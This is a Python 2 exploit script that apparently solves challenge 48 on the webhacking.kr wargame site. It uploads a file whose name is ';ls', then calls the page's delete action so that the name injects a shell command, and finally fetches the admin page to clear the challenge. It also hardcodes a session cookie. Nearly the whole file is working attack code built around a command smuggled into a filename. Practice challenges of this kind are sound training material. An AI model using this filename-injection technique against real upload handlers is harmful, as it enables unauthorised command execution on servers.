#-*- coding: utf-8 -*-
import requests
import CookieManager
import urllib2

challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-12/index.php"

print "[*] Upload File"
parameter = {
    "memo": "bindon", 
}
uploadFile = {
    "upfile": (";ls", "bindon")
}
sessionCookie = {
    "PHPSESSID": "aebaacacaaaaaabcaaaeadabafbccab"
}

timestamp = ""
httpConnection = None
try:
    httpRequest = requests.post(challengeUrl, files=uploadFile, cookies=sessionCookie, data=parameter)
    print httpRequest.text
    startTimeIndex = httpRequest.text.find("time")+5
    endTimeIndex   = httpRequest.text.find(">", startTimeIndex)
    timestamp = httpRequest.text[startTimeIndex:endTimeIndex]
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

print "[*] Delete File and Command Injection"
CookieManager.addCookie("PHPSESSID", "aebaacacaaaaaabcaaaeadabafbccab")
parameter = "?mode=del&time=" + timestamp
httpRequest = urllib2.Request(challengeUrl+parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

print "[*] Clear Challenge 48"
challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-12/zwitter_admin.php"
httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
